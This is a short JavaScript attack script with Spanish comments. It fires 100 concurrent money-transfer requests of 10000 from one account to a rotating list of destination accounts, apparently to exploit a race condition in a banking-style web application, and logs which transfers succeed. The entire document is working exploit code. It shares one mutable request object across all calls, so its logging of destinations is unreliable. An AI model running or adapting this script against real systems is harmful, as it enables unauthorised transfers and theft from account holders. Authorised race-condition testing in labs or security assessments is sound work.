(function enviarRaceCondition() {
    // Información base de la transacción
    let transferInfo = { accountSource: 1001, accountDestination: 2001, amount: 10000, description: '' };

    // Lista de cuentas a transferir
    const accounts = [1002, 1003, 2001, 2002, 2003, 3001, 3002, 3003];

    // Acá se guardarán los procesos de envío de transacciones
    let procesos = [];

    const intentos = 100;
    for (let cantidad = 0, cuenta = 0; cantidad < intentos; cantidad++, cuenta++) {

        // Revisa si llegó a la última cuenta vuelve a iniciar
        if (accounts[cuenta] == undefined) {
            cuenta = 0;
        }

        // Seleccionamos la cuenta a transferir
        transferInfo.accountDestination = accounts[cuenta];

        // Se procede a enviar las transacciones
        procesos.push(enviar(transferInfo, function (data) {
            let time = Date.now();
            let transaccionExitosa = (data.length == 0);

            if (transaccionExitosa) {
                console.log(`%c ${time} - Transferencia exitosa. Cuenta: ${transferInfo.accountDestination}`, 'background: #222; color: #18db4c; font-size: 15px;');
            } else {
                console.log(`%c ${time} - ${data[0]}. Cuenta: ${transferInfo.accountDestination}`, 'background: #222; color: #db1818; font-size: 15px;');
            }
        }));
    }

    // Se espera a que todas las transacciones se ejecuten
    Promise.all(procesos);
})();